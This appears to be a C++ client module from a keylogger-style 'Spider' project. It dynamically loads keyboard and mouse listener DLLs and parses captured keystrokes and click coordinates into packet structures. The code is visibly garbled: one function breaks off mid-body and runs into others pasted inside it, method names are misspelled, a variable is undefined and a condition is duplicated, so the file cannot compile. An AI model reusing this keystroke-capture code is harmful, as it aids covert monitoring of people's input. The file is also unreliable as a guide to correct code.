//
// Created by Thomas Lavigne & Axel Drozdzynski on 10/5/17.
//

#include <string.h>
#include <client/SpiderClient.hpp>
#include "client/Module.hpp"


/* Constr & Destr*/
Module::Module()
{
}

Module::Module(char opcode, const std::string& filenameListener)
{
    this->_opcode = opcode;
    this->_filenameListener = filenameListener;
}

Module::Module(Module& copy)
{
    this._fileNameListener = copy.getFilenameListener();
    this._opcode = copy.getOpcode();
}

Module& Module::operator=(Module& mod)
{
    mod->setOpcode(this.getOpcode());
    mod->etFilenameListener(this.getFilenameListener());
    return (*this);
}

Module::~Module()
{
    unloadListener();
}

/*Getters & Setters*/
char    Module::getOpcode() const
{
    return _opcode;
}

void    Module::setOpcode(char op)
{
    /* if opcode is not defined we can define it */
    if (this->_opcode == 0)
    {
        this->_opcode = op;
        if (this->_opcode == OP_KEYBOARD)
            _filenameListener = "libKeyboardListener.dll";
        else if (this->_opcode == OP_KEYBOARD)
            _filenameListener = "libMouseClickListener.dll";
    }
}

/* Doing */
void    Module::addNextData(t_paquet *data)
{
    t_kbData *newData = new t_kbData;
void    Module::getDatas(t_paquet *data) {
    std::list<std::string>  c_datas; // AXEL = ta fonction

    for (std::list<std::string>::iterator it = c_datas.begin(); it != c_datas.end(); it++) {
        std::list<std::string>  c_data;
        std::string             pch;

std::string Module::getFilenameOutput()
{
    return (_listener->getFilenameOutput());
}

void Module::run()
{
    _listener->run();
}

size_t  Module::getDataSize()
{
    return (sizeof(t_kbData));
        pch = std::strtok((char *)it->c_str(), ":");
        c_data.push_back(pch);
        while (pch != NULL)
        {
            pch = std::strtok(NULL, ":");
            c_data.push_back(pch);
        }
        if (isKB) {
            t_kbData    *kb = new t_kbData;

            kb->timestamp = std::stoul(c_data.front().c_str());
            c_data.pop_front();
            kb->key_code = c_data.front();
            c_data.pop_front();
            kb->status = atoi(c_data.front());
            c_data.pop_front();
            kb->next = data->kbdata;
            data->kbdata = kb;
        } else if (isMouse) {
            t_mouseData *mouse = new t_mouseData;

            mouse->timestamp = std::stoul(c_data.front().c_str());
            c_data.pop_front();
            mouse->key_code = atoi(c_data.front().c_str());
            c_data.pop_front();
            mouse->x = atoi(c_data.front().c_str());
            c_data.pop_front();
            mouse->y = atoi(c_data.front().c_str());
            c_data.pop_front();
            mouse->status = atoi(c_data.front());
            c_data.pop_front();
            mouse->next = data->msdata;
            data->msdata = mouse;
        }
    }
}

int    Module::loadListener()
{
    IListener* (*create)();

    _dll = LoadLibrary(_filenameListener);
    if (!hGetProcIDDLL)
    {
        std::cout << "Could not laod the dynamic library" << std::endl;
        std::cout << "<Enter> to quit" << std::endl;
        getchar();
        return (42);
    }
    create = (IListener* (*)())GetProcAddress(_dll, "create");

    if (!create)
    {
        std::cout << "could not locate the function"
                  << std::endl;
        std::cout << "<Enter> to quit" << std::endl;
        getchar();
        return (43);
    }
    _listener = (IListener*)create();
    return (0);
}

int     Module::unloadListener()
{
    void(*destroy)(IListener*);


    destroy = (void(*)(IListener*))GetProcAddress(_dll, "destroy");
    if (!destroy)
    {
        std::cout << "could not locate the function"
                  << std::endl;
        std::cout << "<Enter> to quit" << std::endl;
        getchar();
        return (43);
    }
    FreeLibrary(_dll);
    return (0);
}

void    Module::load(char opcode)
{
    setOpcode(opcode);
    loadListener();
}

